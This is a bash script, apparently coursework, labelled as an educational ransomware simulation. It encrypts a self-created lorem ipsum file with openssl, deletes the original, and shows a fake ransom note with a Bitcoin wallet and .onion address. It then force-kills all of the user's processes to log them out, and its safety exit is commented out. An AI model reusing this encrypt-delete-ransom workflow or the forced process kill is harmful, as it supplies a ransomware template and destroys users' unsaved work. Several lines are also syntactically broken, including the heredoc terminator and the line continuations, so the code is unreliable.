#!/bin/bash 
# IMPORTANT: This is a SIMULATED ransomware payload for educational purposes ONLY 
# DO NOT distribute or use outside of controlled educational environment 
# 
# Educational Ransomware Simulation 
# Safety Check - Disabled for actual implementation 
#exit 0 # Comment this out when actually demonstrating 
echo "Starting Educational Ransomware Simulation..."

# 1. Create the payload file with lorem ipsum text (5 paragraphs) 
PAYLOAD_FILE="Milestone_1_Payload.txt" 
cat > "$PAYLOAD_FILE" << 'EOF' 
What is Lorem Ipsum? 
Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum 
has been the industry's standard dummy text ever since the 1500s, when an unknown 
printer took a galley of type and scrambled it to make a type specimen book. It has survived 
not only five centuries, but also the leap into electronic typesetting, remaining essentially 
unchanged. It was popularised in the 1960s with the release of Letraset sheets containing 
Lorem Ipsum passages, and more recently with desktop publishing software like Aldus 
PageMaker including versions of Lorem Ipsum. 
Why do we use it? 
It is a long established fact that a reader will be distracted by the readable content of a page 
when looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less 
normal distribution of letters, as opposed to using 'Content here, content here', making it 
look like readable English. Many desktop publishing packages and web page editors now use 
Lorem Ipsum as their default model text, and a search for 'lorem ipsum' will uncover many 
web sites still in their infancy. Various versions have evolved over the years, sometimes by 
accident, sometimes on purpose (injected humour and the like). 
Where does it come from? 
Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of 
classical Latin literature from 45 BC, making it over 2000 years old. Richard McClintock, a 
Latin professor at Hampden-Sydney College in Virginia, looked up one of the more obscure 
Latin words, consectetur, from a Lorem Ipsum passage, and going through the cites of the 
word in classical literature, discovered the undoubtable source. Lorem Ipsum comes from 
sections 1.10.32 and 1.10.33 of "de Finibus Bonorum et Malorum" (The Extremes of Good 
and Evil) by Cicero, written in 45 BC. This book is a treatise on the theory of ethics, very 
popular during the Renaissance. The first line of Lorem Ipsum, "Lorem ipsum dolor sit 
amet..", comes from a line in section 1.10.32. 
The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those 
interested. Sections 1.10.32 and 1.10.33 from "de Finibus Bonorum et Malorum" by Cicero 
are also reproduced in their exact original form, accompanied by English versions from the 
1914 translation by H. Rackham. 
Where can I get some? 
There are many variations of passages of Lorem Ipsum available, but the majority have 
suffered alteration in some form, by injected humour, or randomised words which don't 
look even slightly believable. If you are going to use a passage of Lorem Ipsum, you need to 
be sure there isn't anything embarrassing hidden in the middle of text. All the Lorem Ipsum 
generators on the Internet tend to repeat predefined chunks as necessary, making this the 
first true generator on the Internet. It uses a dictionary of over 200 Latin words, combined 
with a handful of model sentence structures, to generate Lorem Ipsum which looks 
reasonable. The generated Lorem Ipsum is therefore always free from repetition, injected 
humour, or non-characteristic words etc.EOF 

# 2. Define encryption password 
ENCRYPTION_PASSWORD="EduRansomDemo2024!" # Hardcoded for educational purposes 

# 3. Scramble the text in the file using a reversible algorithm (ROT13) 
echo "Scrambling text in payload file..." 
tr 'A-Za-z' 'N-ZA-Mn-za-m' < "$PAYLOAD_FILE" > "${PAYLOAD_FILE}.scrambled" 
mv "${PAYLOAD_FILE}.scrambled" "$PAYLOAD_FILE" 

# 4. Encrypt the file with openssl (AES-256) 
echo "Encrypting payload file..." 
openssl enc -aes-256-cbc -salt -in "$PAYLOAD_FILE" -out "${PAYLOAD_FILE}.encrypted" -k 
"$ENCRYPTION_PASSWORD" 

# 5. Remove original file to simulate "deletion" 
rm "$PAYLOAD_FILE" 

# 6. Display ransomware-like popup message 
zenity --warning \ --title="SECURITY ALERT - FILES ENCRYPTED" \ --text="YOUR FILES HAVE BEEN ENCRYPTED!\n\nAll documents have been secured with 
military-grade encryption.\n\nTo recover your files:\n1. Send 0.5 BTC to wallet: 
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n2. Contact us at 
recovery@securemail.onion\n3. Your recovery key: 
EDUCATION_DEMO_KEY_${ENCRYPTION_PASSWORD}\n\nWarning: Any tampering will 
result in permanent data loss." \ --width=400 \ --height=200 & 

# 7. Display malicious software popup with relevant message 
zenity --info \ --title="SYSTEM MAINTENANCE" \ --text="Security update required. System maintenance in progress...\n\nPlease visit our 
support page for more information." \ --width=300 \ --height=100 &

# 8. Open specified website in default browser 
xdg-open "https://9gag.com/" & 

# 9. Schedule logout after 30 seconds 
sleep 30 
gnome-session-quit --logout --no-prompt 2>/dev/null ||  
killall gnome-session 2>/dev/null || 
pkill -KILL -u $(whoami) 2>/dev/null 
echo "Educational ransomware simulation completed."
